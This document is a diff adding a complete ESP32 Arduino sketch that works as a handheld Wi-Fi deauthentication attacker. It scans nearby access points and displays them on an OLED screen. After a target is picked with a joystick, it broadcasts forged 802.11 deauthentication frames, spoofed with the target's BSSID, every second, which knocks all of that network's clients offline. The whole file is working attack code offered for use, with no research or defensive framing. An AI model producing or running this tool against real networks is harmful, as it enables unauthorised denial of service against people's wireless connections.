@@ -1,0 +1,221 @@
+#include <WiFi.h>
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+
+extern "C" {
+  #include "esp_wifi.h"  // Needed for esp_wifi_80211_tx()
+}
+
+// OLED display parameters
+#define SCREEN_WIDTH 128    // OLED display width, in pixels
+#define SCREEN_HEIGHT 64    // OLED display height, in pixels
+#define OLED_RESET -1       // Reset pin # (or -1 if sharing Arduino reset pin)
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
+
+// Joystick parameters (using analog pins)
+const int JOYSTICK_X = 34; // ESP32 ADC pin for X-axis
+const int JOYSTICK_Y = 35; // ESP32 ADC pin for Y-axis
+const int JOYSTICK_SW = 32; // ESP32 digital pin for the button (pull-up resistor recommended)
+
+// Define a structure to hold information about a network
+typedef struct {
+  String ssid;
+  uint8_t ch;
+  uint8_t bssid[6];
+  int32_t rssi;
+} _Network;
+
+// Global variables
+_Network targetNetwork;
+unsigned long lastDeauth = 0;
+bool attack_in_progress = false;
+
+// Variables for the Wi-Fi scan and menu navigation
+#define MAX_NETWORKS 10 // Max number of networks to display
+_Network networkList[MAX_NETWORKS];
+int networksFound = 0;
+int selectedNetworkIndex = 0;
+
+// Helper function to convert a MAC address byte array to a readable string
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += "0";
+    str += String(b[i], HEX);
+    if (i < size - 1) str += ":";
+  }
+  return str;
+}
+
+// Displays the list of available Wi-Fi networks on the OLED
+void displayMenu() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println("Scan Results:");
+
+  for (int i = 0; i < networksFound; i++) {
+    display.print(i + 1);
+    display.print(". ");
+    display.print(networkList[i].ssid.substring(0, 10)); // Truncate long SSIDs
+    display.print(" (");
+    display.print(networkList[i].rssi);
+    display.println(")");
+    if (i == selectedNetworkIndex) {
+      display.fillTriangle(
+        display.getCursorX() + 2, display.getCursorY() - 7,
+        display.getCursorX() + 7, display.getCursorY() - 4,
+        display.getCursorX() + 2, display.getCursorY() - 1,
+        SSD1306_WHITE); // Added the missing color argument
+    }
+  }
+  display.display();
+}
+
+// Function to scan for Wi-Fi networks and populate the network list
+void scanAndSelectTarget() {
+  // Clear display and show scanning status
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 0);
+  display.println("Scanning for APs...");
+  display.display();
+
+  networksFound = WiFi.scanNetworks();
+  if (networksFound <= 0) {
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("No networks found!");
+    display.display();
+    return;
+  }
+
+  // Cap the number of networks to the max displayable
+  if (networksFound > MAX_NETWORKS) {
+    networksFound = MAX_NETWORKS;
+  }
+  
+  // Store the found networks in the list
+  for (int i = 0; i < networksFound; ++i) {
+    networkList[i].ssid = WiFi.SSID(i);
+    networkList[i].ch = WiFi.channel(i);
+    networkList[i].rssi = WiFi.RSSI(i);
+    const uint8_t *bssid = (const uint8_t *)WiFi.BSSID(i);
+    memcpy(networkList[i].bssid, bssid, 6);
+  }
+
+  // Display the menu for selection
+  displayMenu();
+}
+
+// Sets the target network based on the current selection index
+void setTarget() {
+  if (networksFound > 0) {
+    targetNetwork = networkList[selectedNetworkIndex];
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println("Target selected:");
+    display.println("SSID: " + targetNetwork.ssid);
+    display.println("BSSID: " + bytesToStr(targetNetwork.bssid, 6));
+    display.println("Channel: " + String(targetNetwork.ch));
+    display.display();
+    delay(2000);
+    attack_in_progress = true;
+  }
+}
+
+// Sends a single deauthentication packet
+void sendDeauthPacket() {
+  // Switch the ESP32's Wi-Fi channel to the same channel as the target network
+  esp_wifi_set_channel(targetNetwork.ch, WIFI_SECOND_CHAN_NONE);
+
+  // IEEE 802.11 deauth packet (26 bytes)
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast to all clients
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source: overwritten with AP MAC
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID: overwritten with AP MAC
+    0x00, 0x00,                        // Fragment & sequence number
+    0x07, 0x00                          // Reason code: Class 3 frame error
+  };
+
+  // Replace the placeholder Source and BSSID MACs with the target AP’s MAC address
+  memcpy(&deauthPacket[10], targetNetwork.bssid, 6);
+  memcpy(&deauthPacket[16], targetNetwork.bssid, 6);
+
+  // Send the crafted deauth packet
+  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+
+  // Update status on OLED
+  display.clearDisplay();
+  display.setCursor(0, 0);
+  display.println("Attacking " + targetNetwork.ssid);
+  if (result == ESP_OK) {
+    display.println("Packet sent!");
+  } else {
+    display.println("Failed to send!");
+  }
+  display.display();
+}
+
+void setup() {
+  Serial.begin(115200);
+
+  // Initialize OLED display
+  Wire.begin();
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println(F("SSD1306 allocation failed"));
+    for(;;);
+  }
+  display.display();
+  delay(2000);
+
+  // Initialize joystick button
+  pinMode(JOYSTICK_SW, INPUT_PULLUP);
+
+  // Set the Wi-Fi mode to station (STA)
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  // Perform the initial scan
+  scanAndSelectTarget();
+}
+
+void loop() {
+  // Handle joystick input for menu navigation if attack is not in progress
+  if (!attack_in_progress) {
+    int yValue = analogRead(JOYSTICK_Y);
+    bool buttonState = digitalRead(JOYSTICK_SW);
+
+    // Navigate the menu
+    if (yValue > 4000) { // Joystick moved down
+      selectedNetworkIndex = (selectedNetworkIndex + 1) % networksFound;
+      displayMenu();
+      delay(250);
+    } else if (yValue < 100) { // Joystick moved up
+      if (selectedNetworkIndex > 0) {
+        selectedNetworkIndex--;
+      } else {
+        selectedNetworkIndex = networksFound - 1;
+      }
+      displayMenu();
+      delay(250);
+    }
+
+    // Select the target network with a button press
+    if (buttonState == LOW) {
+      setTarget();
+      delay(500);
+    }
+  } else {
+    // Attack is in progress, send deauth packets periodically
+    if (millis() - lastDeauth > 1000) {
+      sendDeauthPacket();
+      lastDeauth = millis();
+    }
+  }
+}
